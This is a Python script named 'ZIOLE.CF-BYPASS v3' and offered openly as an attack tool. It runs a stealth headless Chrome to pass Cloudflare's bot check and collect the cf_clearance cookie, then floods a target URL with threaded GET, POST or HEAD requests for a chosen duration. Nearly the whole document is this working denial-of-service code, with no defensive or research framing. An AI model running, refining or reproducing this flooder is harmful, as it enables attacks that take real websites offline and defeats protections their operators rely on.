import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import requests, threading, argparse, time

BANNER = """
███████╗██╗ ██████╗ ██╗     ███████╗
██╔════╝██║██╔═══██╗██║     ██╔════╝
█████╗  ██║██║   ██║██║     █████╗  
██╔══╝  ██║██║   ██║██║     ██╔══╝  
██║     ██║╚██████╔╝███████╗███████╗
╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚══════╝
  ZIOLE.CF-BYPASS v3 | MULTI-MODE
"""

def get_cf_cookie(target):
    print("[•] Launching Chrome Stealth Mode...")
    options = uc.ChromeOptions()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-blink-features=AutomationControlled")
    driver = uc.Chrome(options=options)
    driver.get(target)
    time.sleep(6)
    cookies = driver.get_cookies()
    cf_clearance = None
    for c in cookies:
        if c['name'] == 'cf_clearance':
            cf_clearance = c['value']
    ua = driver.execute_script("return navigator.userAgent")
    driver.quit()
    if not cf_clearance:
        print("[x] Gagal mendapatkan cf_clearance.")
        exit()
    print(f"[✓] cf_clearance token: {cf_clearance[:10]}...")
    print(f"[✓] User-Agent: {ua[:30]}...")
    return cf_clearance, ua

def attack(target, cf_clearance, ua, duration, threads, mode):
    timeout = time.time() + duration
    def send():
        s = requests.Session()
        s.headers.update({
            "User-Agent": ua,
            "Cookie": f"cf_clearance={cf_clearance}"
        })
        while time.time() < timeout:
            try:
                if mode == "get":
                    res = s.get(target, timeout=5)
                elif mode == "post":
                    res = s.post(target, data={"ziole": "AR.code"}, timeout=5)
                elif mode == "head":
                    res = s.head(target, timeout=5)
                else:
                    print(f"[!] Invalid mode: {mode}")
                    break
                print(f"[✓] {mode.upper()} {target} -> {res.status_code}")
            except Exception as e:
                print(f"[x] ERR: {e}")
    for _ in range(threads):
        threading.Thread(target=send, daemon=True).start()
    time.sleep(duration)

if __name__ == "__main__":
    print(BANNER)
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True, help="Target URL with https://")
    parser.add_argument("--duration", type=int, default=60, help="Duration of attack (s)")
    parser.add_argument("--threads", type=int, default=100, help="Threads")
    parser.add_argument("--mode", default="get", help="Attack mode: get / post / head")
    args = parser.parse_args()

    cf, ua = get_cf_cookie(args.target)
    print(f"[+] Starting {args.mode.upper()} attack for {args.duration}s x {args.threads} threads...\n")
    attack(args.target, cf, ua, args.duration, args.threads, args.mode)
    print("\n[✓] Done! ZIOLE STRIKES COMPLETE 💥")
